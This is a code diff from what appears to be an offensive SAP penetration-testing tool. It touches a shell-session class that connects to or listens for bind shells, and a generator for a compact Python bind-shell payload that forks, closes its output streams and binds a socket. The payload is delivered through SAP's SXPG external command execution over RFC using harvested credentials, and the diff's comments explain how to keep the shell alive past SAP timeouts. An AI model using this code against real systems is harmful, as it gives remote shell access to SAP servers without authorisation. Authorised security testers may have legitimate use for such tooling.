@@ -232,12 +232,13 @@ class ShellSession:
             threading.Thread(target=self._listener_loop, daemon=True).start()
         except OSError as e:
             self.status = "error"
-            self.error_msg = f"Cannot bind port {self.listen_port}: {e}"
+            self.error_msg = f"Cannot bind port {self.port}: {e}"
 
     def _listener_loop(self):
         try:
             self.server_sock.settimeout(120)
             self.client_sock, self.client_addr = self.server_sock.accept()
+            self.client_sock.settimeout(None)  # blocking for reader
             self.status = "connected"
             self.server_sock.close()
             self.server_sock = None
@@ -279,12 +280,17 @@ class ShellSession:
                         _socket_mod.AF_INET, _socket_mod.SOCK_STREAM)
                     self.client_sock.settimeout(5)
                     self.client_sock.connect((target_host, self.port))
+                self.client_sock.settimeout(None)  # blocking for reader
                 self.client_addr = (target_host, self.port)
                 self.status = "connected"
+                print(f"[+] Bind shell connected to "
+                      f"{target_host}:{self.port}")
                 threading.Thread(
                     target=self._reader_loop, daemon=True).start()
                 return
-            except Exception:
+            except Exception as e:
+                print(f"[*] Bind shell connect attempt {attempt+1}/30 "
+                      f"to {target_host}:{self.port}: {e}")
                 time.sleep(1)
         self.status = "error"
         self.error_msg = (f"Could not connect to bind shell at "
@@ -430,9 +436,12 @@ def _generate_bind_payload(os_type: str, port: int) -> dict:
         # Build compact code under 250 chars.
         # CRITICAL: must fork() so the bind shell survives after
         # SAPXPG/GW connection closes (P4 timeout kills the process).
+        # Close fd 1+2 after fork so SXPG's stdout pipe gets EOF
+        # and the RFC call returns (otherwise SXPG blocks forever).
         py_code = (
             f"o=__import__('os');"
             f"o.fork()and(o._exit(0));"
+            f"o.close(1);o.close(2);"
             f"s=__import__('socket').socket(2,1);"
             f"s.setsockopt(1,2,1);"
             f"s.bind(('',{port}));"
@@ -1362,6 +1371,10 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 creds = node.best_credentials()
                 if not creds:
                     print(f"[-] {sid}: No credentials for SXPG shell")
+                    with _shell_lock:
+                        if _shell_session:
+                            _shell_session.status = "error"
+                            _shell_session.error_msg = "No credentials for SXPG"
                     return
                 result = sapmap_rfc.execute_local_command(
                     node, payload["command"], payload["params"], creds)
@@ -1386,6 +1399,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 print(f"[-] {sid}: Payload delivery failed: {err}")
                 with _shell_lock:
                     if _shell_session and _shell_session.status == "waiting":
+                        _shell_session.status = "error"
                         _shell_session.error_msg = f"Payload failed: {err}"
 
         threading.Thread(target=_send, daemon=True).start()
